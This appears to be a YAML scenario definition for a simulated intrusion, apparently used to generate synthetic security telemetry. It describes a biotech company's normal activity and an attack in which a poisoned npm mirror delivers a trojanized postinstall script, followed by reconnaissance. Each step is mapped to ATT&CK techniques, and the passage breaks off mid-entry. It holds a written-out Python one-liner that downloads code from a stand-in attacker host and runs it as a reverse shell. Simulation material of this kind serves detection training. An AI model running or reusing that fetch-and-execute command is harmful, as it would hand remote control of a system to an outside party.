time_window:
  start: "2024-06-11T14:00:00Z"
  duration: "48h"

baseline_activity:
  description: >
    Normal weekday activity for a biotech company. Developers write code and SSH
    to build servers. R&D scientists run Jupyter notebooks and query PostgreSQL.
    Business staff handle email, spreadsheets, and web browsing. IT staff manage
    infrastructure via RDP and SSH. All outbound web traffic routes through the
    corporate proxy. Activity concentrated during business hours (7am-7pm PDT /
    14:00-02:00 UTC) with minimal overnight.
  intensity: medium
  variation: medium

storyline:
  # ============================================================
  # THREAD A — EXTERNAL BREACH: Watering Hole → Dev → R&D
  # ============================================================

  # --- Watering hole: Raj visits poisoned npm mirror, downloads trojanized package ---
  - time: "+3h"
    actor: raj.patel
    system: DEV-RPATEL
    activity: >
      Raj Patel runs npm install for a project dependency. The corporate npm mirror
      (npm-mirror.helix-cdn.com) has been poisoned — the lodash-utils package contains
      a postinstall script that downloads and executes a Python reverse shell.
    events:
      - type: connection
        dst_ip: "203.0.113.80"
        dst_port: 443
        service: "ssl"
        technique: "T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain"
        description: "npm install fetches trojanized package from poisoned mirror via HTTPS"
      - type: process
        process_name: "/usr/bin/node"
        command_line: "node /home/raj.patel/projects/helix-api/node_modules/lodash-utils/scripts/postinstall.js"
        technique: "T1204.002 - User Execution: Malicious File"
        description: "npm postinstall script executes malicious JavaScript payload"

  # --- Reverse shell established ---
  - time: "+3h1m"
    actor: raj.patel
    system: DEV-RPATEL
    activity: >
      Postinstall script downloads Python reverse shell from C2 and executes it.
      Shell connects back to attacker infrastructure over HTTPS on port 8443.
    events:
      - type: process
        process_name: "/usr/bin/python3"
        command_line: "python3 -c 'import urllib.request;exec(urllib.request.urlopen(\"https://203.0.113.80:8443/s\").read())'"
        technique: "T1059.006 - Command and Scripting Interpreter: Python"
        description: "Python reverse shell downloaded and executed in memory"
      - type: connection
        dst_ip: "203.0.113.80"
        dst_port: 8443
        service: "ssl"
        technique: "T1571 - Non-Standard Port"
        description: "Reverse shell connects to C2 over HTTPS on non-standard port 8443"

  # --- Local reconnaissance on dev workstation ---
  - time: "+3h5m"
    actor: raj.patel
    system: DEV-RPATEL
    activity: "Local reconnaissance — enumerate current user and system info"
    events:
      - type: process
        process_name: "/usr/bin/id"
        command_line: "id"
        technique: "T1033 - System Owner/User Discovery"
      - type: process
        process_name: "/usr/bin/uname"
        command_line: "uname -a"
        technique: "T1082 - System Information Discovery"
      - type: process
